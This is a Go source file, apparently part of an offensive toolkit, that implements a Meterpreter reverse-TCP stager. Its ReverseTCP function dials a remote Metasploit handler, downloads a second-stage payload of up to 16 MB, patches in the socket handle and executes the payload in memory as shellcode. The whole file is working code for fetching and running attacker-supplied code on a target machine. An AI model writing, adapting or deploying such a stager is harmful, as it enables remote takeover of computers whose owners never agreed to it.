package meterpreter

import (
	"encoding/binary"
	"io"
	"net"
	"runtime"

	"github.com/pkg/errors"

	"project/internal/module/shellcode"
)

// ReverseTCP is used to connect Metasploit handler.
func ReverseTCP(network, address, method string) error {
	rAddr, err := net.ResolveTCPAddr(network, address)
	if err != nil {
		return err
	}
	conn, err := net.DialTCP(network, nil, rAddr)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	// receive stage size
	stageSizeBuf := make([]byte, 4)
	_, err = io.ReadFull(conn, stageSizeBuf)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage size")
	}
	stageSize := int(binary.LittleEndian.Uint32(stageSizeBuf))
	if stageSize < 128 {
		return errors.New("stage is too small that < 128 Byte")
	}
	if stageSize > 16<<20 {
		return errors.New("stage is too big that > 16 MB")
	}
	// receive stage
	stage := make([]byte, stageSize)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage")
	}
	// make final stage
	final := make([]byte, 9+stageSize)
	for i := 0; i < stageSize; i++ {
		final[i+9] = stage[i]
		stage[i] = 0 // cover stage at once
	}
	// write socket point
	final[0] = 0xBF
	binary.LittleEndian.PutUint32(final[1:9], uint32(conn.Handle()))
	// final[1] = byte(conn.Handle())
	// final[2] = 0x00
	// final[3] = 0x00
	// final[4] = 0x00
	switch runtime.GOOS {
	case "windows":
		// force use it, other it will panic because meterpreter need rwx memory
		method = shellcode.MethodCreateThread
	}
	return shellcode.Execute(method, final)
}
